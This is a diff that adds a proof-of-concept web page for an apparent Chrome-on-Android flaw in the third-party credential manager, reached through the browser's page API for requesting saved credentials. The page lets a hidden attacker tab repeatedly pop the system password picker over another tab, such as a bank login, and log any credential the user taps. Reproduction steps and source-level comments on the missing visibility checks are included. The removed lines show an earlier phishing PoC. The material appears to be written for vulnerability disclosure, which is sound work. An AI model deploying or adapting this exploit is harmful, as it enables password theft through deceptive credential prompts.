@@ -1,28 +1,131 @@
 
-<head>PoC of phishing page</head>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>attacker.example - 3P CredMan visibility-gate bypass</title>
+<style>
+  body { font-family: sans-serif; margin: 1.5em; }
+  #log { white-space: pre-wrap; font-family: monospace; font-size: 12px;
+         background: #111; color: #0f0; padding: 1em; height: 50vh;
+         overflow-y: scroll; }
+  .hint { color: #555; }
+</style>
+</head>
+<body>
+<h2>ThirdPartyCredentialManagerImpl: no tab-visibility gate</h2>
+<p class="hint">
+  Precondition: Chrome on Android, third-party password manager set as system
+  Autofill service, and Chrome &rarr; Settings &rarr; Autofill Options &rarr;
+  "Autofill using another service" enabled.
+</p>
+<ol>
+  <li>Load this page (attacker tab).</li>
+  <li>Open a <b>new tab</b> (e.g. your bank's login page) so this tab becomes
+      <code>hidden</code>.</li>
+  <li>Watch the Android system Credential Manager bottom sheet repeatedly
+      appear over the foreground tab even though <i>this</i> hidden tab
+      requested it. Dismiss it &mdash; it reappears ~2&nbsp;s later
+      (no PENDING_REQUEST throttle).</li>
+  <li>Variant: navigate this tab to <code>about:blank</code> while a sheet is
+      showing &mdash; the sheet survives (null CancellationSignal, empty
+      ResetAfterDisconnecting()).</li>
+</ol>
+<p>
+  <button onclick="armOnHide()">Arm: fire when tab becomes hidden</button>
+  <button onclick="fireNow()">Fire once now (sanity check)</button>
+  <button onclick="disarm()">Disarm</button>
+  &nbsp;|&nbsp;
+  <a href="poc-store.html">store() variant &rarr;</a>
+</p>
+<div id="log"></div>
 <script>
-  async function signIn() {
-    await navigator.login.setStatus("logged-in");
-    try{
-      const credential = await navigator.credentials.get({
-        identity: {
-          mediation: "optional",
-          providers: [{
-            configURL: "http://localhost:8001/config.json",
-            clientId: "123",
-            nonce: '******',
-          }]
-        }
-      });
-    } catch (e) {
-      fetch("/signal");
-    }
-  }
+'use strict';
 
-  async function test() {
-    var w = window.open("child.html", "hello", "width=500,height=500");
-    await signIn();
+let timer = null;
+let n = 0;
+
+function log(s) {
+  const el = document.getElementById('log');
+  el.textContent += `[${new Date().toISOString()}] ${s}\n`;
+  el.scrollTop = el.scrollHeight;
+  console.log(s);
+}
+
+async function fire() {
+  n++;
+  const id = n;
+  log(`#${id} navigator.credentials.get({password:true}) ` +
+      `visibilityState=${document.visibilityState} hidden=${document.hidden}`);
+  try {
+    // mediation:'required' forces the picker even with a single match.
+    // Renderer side (credential_utils.cc) only checks secure-context +
+    // not-fenced-frame; no focus / visibility / user-activation gate.
+    // Browser side (third_party_credential_manager_impl.cc) only checks
+    // cert status, OTR, and mediation kind; no GetVisibility() gate.
+    const cred = await navigator.credentials.get({
+      password: true,
+      mediation: 'required',
+    });
+    if (cred) {
+      // If the user taps a credential in the out-of-context sheet, we get it.
+      log(`#${id} -> GOT CREDENTIAL  id="${cred.id}"  ` +
+          `password.length=${cred.password ? cred.password.length : 0}`);
+    } else {
+      log(`#${id} -> null (dismissed / no credential)`);
+    }
+  } catch (e) {
+    log(`#${id} -> ${e.name}: ${e.message}`);
   }
+}
+
+function fireNow() { fire(); }
+
+function armOnHide() {
+  disarm();
+  log('Armed. Switch to another Chrome tab now.');
+  document.addEventListener('visibilitychange', onVis);
+  // Some Android tab-switcher transitions don't fire visibilitychange until
+  // the new tab is selected; also start a watchdog interval.
+  if (document.hidden) startLoop();
+}
+
+function onVis() {
+  log(`visibilitychange -> ${document.visibilityState}`);
+  if (document.hidden) {
+    startLoop();
+  } else {
+    stopLoop();
+  }
+}
+
+function startLoop() {
+  if (timer !== null) return;
+  log('Tab hidden: starting get() loop (every 2000ms).');
+  fire();
+  timer = setInterval(fire, 2000);
+}
+
+function stopLoop() {
+  if (timer === null) return;
+  clearInterval(timer);
+  timer = null;
+  log('Tab visible: loop stopped.');
+}
+
+function disarm() {
+  document.removeEventListener('visibilitychange', onVis);
+  stopLoop();
+  log('Disarmed.');
+}
+
+log(`Loaded. isSecureContext=${window.isSecureContext} ` +
+    `origin=${location.origin}`);
+if (!window.isSecureContext) {
+  log('WARNING: navigator.credentials requires a secure context. ' +
+      'Serve over HTTPS or localhost.');
+}
 </script>
-<br><br><br>
-<button onclick="test()" >Sign in with Google</button>
+</body>
+</html>
